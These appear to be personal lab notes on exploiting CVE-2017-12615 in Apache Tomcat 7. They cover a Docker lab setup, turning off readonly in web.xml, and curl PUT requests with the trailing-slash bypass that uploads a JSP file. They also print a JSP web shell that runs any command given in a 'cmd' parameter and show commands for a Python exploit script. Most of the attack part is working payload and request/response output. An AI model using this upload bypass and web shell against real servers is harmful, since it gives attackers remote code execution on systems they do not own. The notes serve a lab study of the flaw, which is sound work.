https://blogs.oracle.com/pshuff/installing-tomcat-on-docker

sudo yum install docker
sudo systemctl start docker

sudo docker search tomcat
sudo docker pull consol/tomcat-7.0

sudo docker run -p consol/tomcat-7.0
sudo docker ps

sudo docker inspect -f format='{{.NetworkSettings.IPAddress}}' 1e381042bdd2

sudo docker container exec -it 1e381042bdd2 /bin/bash
cd /opt/tomcat/conf


apt-get update
apt-get install nano
 
cd /opt/tomcat/conf
nano web.xml 

	<init-param>
                <param-name>readonly</param-name>
                <param-value>false</param-value>
        </init-param>


sudo docker commit 1e381042bdd2 consol/tomcat-7.0:CVE-2017-12615
sudo docker container restart 1e381042bdd2 


python3 prob2_exploit.py -u http://172.17.0.2:8080
python3 prob2_exploit.py -u http://172.17.0.2:8080 -p pwn





https://nvd.nist.gov/vuln/detail/CVE-2017-12615

https://github.com/breaktoprotect/CVE-2017-12615
Exploit using 'curl':

    Create a .jsp file (e.g. test.jsp):

<% out.write("<html><body><h3>[+] JSP file successfully uploaded via curl and JSP out.write  executed.</h3></body></html>"); %>

    Perform the curl command on target server:

curl -X PUT http://target-host-or-ip-address:port/test.jsp/ -d @- < test.jsp

    Check if your file is uploaded by browsing to the target address or:

curl http://target-host-or-ip-address:port/test.jsp


CVE-2017-12615

Reference : https://nvd.nist.gov/vuln/detail/CVE-2017-12615

1. Bug explaination

When running Apache Tomcat  7.0.0 to 7.0.79 on Windows with HTTP
PUTs enabled (e.g. via setting the read-only initialisation parameter of the Default to
false) it was possible to upload a JSP file to the server via a specially crafted request. This
JSP could then be requested and any code it contained would be executed by the server.
That could lead to remote code execution on the server.

Apache Tomcat is used to deploy your Java Servlets and JSPs. 
So in your Java project you can build your WAR (short for Web ARchive) file, and just drop it in the deploy directory in Tomcat. 
So basically Apache is an HTTP Server, serving HTTP. 
Tomcat is a Servlet and JSP Server serving Java technologies.

Jakarta Server Pages (JSP; formerly JavaServer Pages) is a collection of technologies that helps software developers create dynamically generated web pages based on HTML, XML, SOAP, or other document types. 
A JSP file is a server-generated web page. It is similar to an . ASP or . PHP file, but contains Java code instead of ActiveX or PHP. 
The code is parsed by the web server, which generates HTML that is sent to the user's computer.


Lab Pre-requiste:
0. Lab setup: 
	install docker image
		sudo docker run -p consol/tomcat-7.0
	get container id and port
		sudo docker ps 
	get ip address
		sudo docker inspect -f format='{{.NetworkSettings.IPAddress}}' [container id]

1. PUT method is enabled through conf/web.xml

	(By default, readonly=true i.e PUT disabled, so we are changing it to false by addint the following syntax now PUT enabled)

<init-param>
 <param-name>readonly</param-name>
 <param-value>false</param-value>
</init-param>

Updated conf/web.xml file
	Picture:0.0

2. No authentication enforced in the security-constraint set at the app's WEB-INF/web.xml
	(Removing authentication while uploading files)

<auth-constraint>
<role-name>admin</role-name>
</auth-constraint>



General

By design, if you try to upload a JSP file via the HTTP PUT method on the Tomcat server, it won't work. You can upload .html, .jpg, or any other extensions except .jsp, .jspx and the variants. 

	Command: curl -v -X PUT http://172.17.0.2:8080/test.jsp -d @- < test.jsp
	Picture: 1

	 Request:
	PUT /myfile.jsp HTTP/1.1Host: 127.0.0.1:8080Connection: closeContent-Length: 85
	<% out.write("<html><body><h3>[+] JSP upload successfully.</h3></body></html>"); %>

	 Response:
	HTTP/1.1 404 Not FoundServer: Apache-Coyote/1.1Content-Type: text/html;charset=utf-8Content-Language: enContent-Length: 971Date: Sat, 23 Sep 2017 06:07:27 GMTConnection: close
	...SNIPPED.<html><head><title>Apache Tomcat/7.0.79 - Error report</title><style><!--H1

However, you can bypass the extension check by appending a '/' behind the .jsp extension:

	Command: curl -v -X PUT http://172.17.0.2:8080/test.jsp/ -d @- < test.jsp
	Picture: 2

	 Request:
	PUT /myfile.jsp/ HTTP/1.1
	Host: 127.0.0.1:8080
	Connection: close
	Content-Length: 85

	Response:
	HTTP/1.1 201 Created
	Server: Apache-Coyote/1.1
	Content-Length: 0
	Date: Sat, 23 Sep 2017 06:45:50 GMT
	Connection: close

Now if we connect to http://172.17.0.2:8080/test.jsp , the java code runs and returns expected body.
	picture: 3


Exploitation:

	Simple Remote code Execution with limited functionalities.

If we send a crafted payload usinf test.jsp file, it gives us the RCE.Its actually a form that takes in the command , runs it on the server and returns the result.

	Payload: 

	<FORM METHOD=GET ACTION='{}'>""".format(f)+"""
	    <INPUT name='cmd' type=text>
	    <INPUT type=submit value='Run'>
	    </FORM>
	    <%@ page import="java.io.*" %>
	    <%
	   String cmd = request.getParameter("cmd");
	   String output = "";
	   if(cmd != null) {
	      String s = null;
	      try {
	         Process p = Runtime.getRuntime().exec(cmd,null,null);
	         BufferedReader sI = new BufferedReader(new
	InputStreamReader(p.getInputStream()));
	         while((s = sI.readLine()) != null) { output += s+"</br>"; }
	      }  catch(IOException e) {   e.printStackTrace();   }
	   }
	%>
	<pre><%=output %></pre>

I have implemented this using python script.

Post Lab Setup:

Exploit:

Command: 	
	python3 exploit.py http://172.17.0.2:8080 pwn
	picture: 4
	picture: 5












 


